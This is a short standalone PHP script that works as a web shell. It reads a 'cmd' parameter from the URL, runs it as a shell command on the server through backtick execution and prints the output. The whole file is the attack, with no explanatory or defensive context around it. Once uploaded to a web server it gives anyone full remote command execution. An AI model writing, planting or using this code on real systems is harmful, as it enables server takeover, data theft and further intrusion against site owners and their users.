<?php
if (isset($_GET['cmd']))
{
	$cmd = $_GET['cmd'];
	$result = `$cmd`;
	echo "<br />Command '" . $cmd . "' execution done: <br />";
	echo $result;
}
?>